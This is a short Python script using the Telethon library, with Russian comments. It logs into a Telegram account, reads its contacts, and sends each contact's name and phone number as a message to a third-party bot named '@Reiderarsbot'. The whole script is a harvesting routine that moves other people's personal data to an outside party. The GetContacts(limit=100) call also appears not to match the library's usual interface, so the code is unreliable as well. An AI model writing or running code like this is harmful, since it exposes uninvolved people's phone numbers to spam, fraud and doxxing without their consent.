import asyncio
from telethon import TelegramClient
from telethon.tl.functions.contacts import GetContacts

# Введите ваши данные
api_id = 'YOUR_API_ID'
api_hash = 'YOUR_API_HASH'
bot_username = '@Reiderarsbot'  # Например, 'my_bot'

# Авторизация
client = TelegramClient('session_name', api_id, api_hash)

async def main():
    await client.start()

    # Получаем контакты
    contacts = await client(GetContacts(limit=100))

    # Пересылаем каждый контакт в бота
    for contact in contacts.users:
        if contact.phone:  # Проверяем, есть ли номер телефона
            # Формируем сообщение
            message = f"Имя: {contact.first_name}, Фамилия: {contact.last_name}, Номер: {contact.phone}"
            await client.send_message(bot_username, message)
            print(f"Отправлено: {message}")
            await asyncio.sleep(0)  # Задержка 0 секунд (не рекомендуется)

with client:
    client.loop.run_until_complete(main())
